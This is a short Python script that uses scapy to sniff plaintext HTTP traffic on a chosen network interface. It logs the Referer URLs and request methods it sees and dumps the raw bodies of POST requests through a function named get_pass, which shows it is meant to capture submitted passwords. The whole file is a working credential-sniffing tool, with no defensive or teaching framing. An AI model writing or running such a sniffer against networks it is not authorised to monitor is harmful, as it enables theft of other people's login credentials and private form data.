import scapy.all as scapy 
from scapy.layers.http import HTTPRequest
from colorama import *
import os

YELLOW = Fore.YELLOW
RED = Fore.RED


def process_sniff_packet(packet):
    global method
    if packet.haslayer(HTTPRequest):
        url = packet[HTTPRequest].Referer
        method = packet[HTTPRequest].Method.decode()
        get_pass(packet)
        try:
            print(f"{YELLOW} [+] {url.decode()} with {method}")
        except AttributeError:
            pass
def get_pass(packet):
    if packet.haslayer(scapy.Raw) and method=="POST":
        print(f"{RED} [$] {packet[scapy.Raw].load}")

print("Please Select Your INterface ")

os.system("basename -a /sys/class/net/*")

interface = input("Please ENter You Interface To Sniff In ")

scapy.sniff(iface=interface,store=False,filter="port 80",prn=process_sniff_packet)

